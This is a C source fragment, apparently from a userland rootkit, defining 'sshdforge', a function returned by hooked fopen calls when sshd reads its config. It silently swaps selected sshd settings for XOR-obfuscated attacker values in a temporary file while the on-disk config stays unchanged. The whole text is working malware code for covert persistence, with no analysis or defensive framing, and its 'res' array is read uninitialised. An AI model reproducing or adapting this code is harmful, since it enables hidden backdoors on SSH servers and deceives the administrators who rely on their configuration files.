/* the function in here works the same exact way as the original.
 * this is just inherently a thousand times better... this pointer
 * is returned by the (f)open hooks when being called by sshd.
 * see the original for better comments. */

FILE *sshdforge(const char *pathname){
    FILE *fp, *tmp;
    char line[LINE_MAX],
         *linedup, *ss,
         *curtarget, *cursettingval,
         *curaval, *curtval;
    size_t targetlen;
    u_short skipline, res[PATCH_TARGETS_SIZE];

    hook(CFOPEN, CFWRITE);

    fp = call(CFOPEN, pathname, "r");
    if(fp == NULL) return NULL;

    if(rknomore())
        return fp;

    tmp = tmpfile();
    if(tmp == NULL) return fp;

    while(fgets(line, sizeof(line), fp) != NULL){
        skipline = 0;

        for(size_t i=0; i<PATCH_TARGETS_SIZE; i++){
            if(res[i] == 1)
                continue;

            curtarget = xordup(patch_targets[i]);
            if(!curtarget) break;
            targetlen = strlen(curtarget);

            if(!strncmp(line, curtarget, targetlen)){
                linedup = strdup(line);
                if(!linedup){
                    clean(curtarget);
                    break;
                }

                cursettingval = strtok(linedup, " ");
                cursettingval = strtok(NULL, " ");

                curaval = xordup(antival[i]);
                if(!curaval){
                    clean(curtarget);
                    clean(linedup);
                    break;
                }
                ss = strstr(cursettingval, curaval);
                clean(curaval);

                if(ss){
                    curtval = xordup(targetval[i]);
                    if(!curtval){
                        clean(curtarget);
                        clean(linedup);
                        break;
                    }
                    fprintf(tmp, "\n%s %s\n", curtarget, curtval);
                    clean(curtval);
                    skipline = 1;
                }
                clean(curtarget);

                res[i] = 1;
                clean(linedup);
                break;
            }
            clean(curtarget);
        }
        !skipline ? fprintf(tmp, "%s", line) : 0;
    }

    for(size_t i=0; i<PATCH_TARGETS_SIZE; i++){
        if(res[i] != 1){
            curtarget = xordup(patch_targets[i]);
            if(!curtarget) continue;
            curtval = xordup(targetval[i]);
            if(!curtval){
                clean(curtarget);
                continue;
            }
            fprintf(tmp, "\n%s %s\n", curtarget, curtval);
            clean(curtval);
            clean(curtarget);
        }
    }

    fclose(fp);
    rewind(tmp);
    return tmp;
}